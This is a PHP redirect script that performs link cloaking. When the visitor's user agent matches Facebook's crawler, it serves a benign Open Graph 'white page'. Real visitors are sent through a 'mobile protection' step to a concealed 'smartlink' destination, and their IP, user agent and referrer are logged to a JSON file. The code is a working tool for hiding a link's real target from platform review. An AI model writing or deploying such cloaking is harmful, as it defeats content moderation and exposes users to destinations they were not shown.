<?php
require_once 'mobile_protection.php';

function generateRandomFbAppId() {
    $digits = '0123456789';
    $length = rand(15, 16);
    $appId = '';
    for ($i = 0; $i < $length; $i++) {
        $appId .= $digits[rand(0, 9)];
    }
    return $appId;
}

$token = $_GET['token'] ?? '';

if (!$token) {
    http_response_code(404);
    echo 'Invalid link';
    exit;
}

$links = json_decode(file_get_contents(__DIR__ . '/links.json'), true) ?? [];
$linkData = null;
foreach ($links as $link) {
    if ($link['token'] === $token) {
        $linkData = $link;
        break;
    }
}

if (!$linkData) {
    http_response_code(404);
    echo 'Link not found';
    exit;
}

function isFacebookBot() {
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $fbBots = ['facebookexternalhit', 'Facebot', 'Facebook'];

    foreach ($fbBots as $bot) {
        if (stripos($userAgent, $bot) !== false) {
            return true;
        }
    }
    return false;
}

if (isFacebookBot()) {
    // Serve OG metadata white page
    header('Content-Type: text/html; charset=utf-8');
    $title = htmlspecialchars($linkData['og']['title'] ?? '');
    $description = htmlspecialchars($linkData['og']['description'] ?? '');
    $image = htmlspecialchars($linkData['og']['image'] ?? '');
    $url = htmlspecialchars('https://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']);
    $fbAppId = '1604020986967005';
    echo <<<HTML
<!DOCTYPE html>
<html>
<head>
    <title>{$title}</title>
    <meta property="fb:app_id" content="{$fbAppId}" />
    <meta property="og:title" content="{$title}" />
    <meta property="og:description" content="{$description}" />
    <meta property="og:image" content="{$image}" />
    <meta property="og:url" content="{$url}" />
    <meta property="og:type" content="website" />
</head>
<body>
    <div style="display:none;">{$description}</div>
</body>
</html>
HTML;
    exit;
}





$protection = new AdvancedMobileProtection();
$finalUrl = $protection->process($linkData['smartlink']);

$clicks = json_decode(file_get_contents(__DIR__ . '/clicks.json'), true) ?? [];
$clicks[] = [
    'token' => $token,
    'timestamp' => time(),
    'ip' => $_SERVER['REMOTE_ADDR'] ?? '',
    'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? '',
    'referrer' => $_SERVER['HTTP_REFERER'] ?? ''
];
file_put_contents(__DIR__ . '/clicks.json', json_encode($clicks, JSON_PRETTY_PRINT));

header('Location: ' . $finalUrl);
exit;
?>
